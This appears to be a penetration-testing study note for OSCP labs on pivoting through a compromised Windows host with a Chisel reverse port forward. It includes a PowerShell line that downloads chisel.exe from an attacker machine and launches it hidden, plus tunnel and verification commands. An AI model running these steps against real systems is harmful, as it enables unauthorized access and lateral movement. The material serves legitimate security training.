# Windows - Port Forwarding

**Step 27A of 50 · Windows**

*Expose a loopback-only Windows service through a compromised host.*

## Run this

From the foothold, enumerate local listeners before choosing a tunnel:

~~~cmd
ipconfig /all
netstat -ano
tasklist /v
~~~

When the target service is bound to 127.0.0.1 and the foothold can make an
outbound HTTP connection, use a Chisel reverse port forward.

Kali:

~~~bash
chisel server -p $ChiselPort --reverse
~~~

Windows pivot:

~~~powershell
iwr http://$LocalIP:$WebPort/chisel.exe -OutFile C:/Users/Public/chisel.exe
Start-Process -WindowStyle Hidden -FilePath C:/Users/Public/chisel.exe -ArgumentList 'client $LocalIP:$ChiselPort R:$InternalPort:127.0.0.1:$InternalPort'
~~~

The R prefix makes the listener appear on Kali. The destination address and
port are evaluated from the Windows pivot's network namespace.

Confirm the forward from Kali:

~~~bash
nmap -sT -sV -Pn -n -p $InternalPort 127.0.0.1
nc -nv -w 5 127.0.0.1 $InternalPort
~~~

## What did you get?

- [ ] A loopback listener is found → **Set InternalPort and forward only that service**
- [ ] Chisel reports a client/version mismatch but opens the remote → **Continue if the mapping is listening; version matching is preferable**
- [ ] The local port is open through Chisel → **Run the service-specific exploit**
- [ ] The client is killed or the binary is locked → **Run taskkill /F /IM chisel.exe, verify it is gone, and transfer it again**
- [ ] The target cannot make an outbound connection → **Try a different authorized tunnel in [[Port Redirection and SSH Tunneling (Decision Tree)]]**

## Notes

For a single service, a specific reverse mapping is simpler than a SOCKS proxy:

~~~text
R:$InternalPort:127.0.0.1:$InternalPort
~~~

The Kali-side port can be different from the destination port when a local
listener already occupies the port.

## Gotcha

> [!warning] 💡
> Verify the tunnel with a TCP connect before running the exploit. Nmap must use
> -sT, -Pn, and -n because raw packet scans and target discovery do not traverse
> a user-space TCP forward reliably.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- Chisel exposed CloudMe on 127.0.0.1:8888

## Related stages

- [[Windows - Shell Received]]
- [[Windows - Remote - CloudMe Buffer Overflow]]
- [[Windows - Clean Down]]

## External Resources

- [[Chisel]]
- [[Port Redirection and SSH Tunneling]]

## Why this matters for OSCP

Loopback services are invisible to the perimeter scan but often contain the
next exploit. A narrow port forward keeps the investigation focused and easy
to verify.
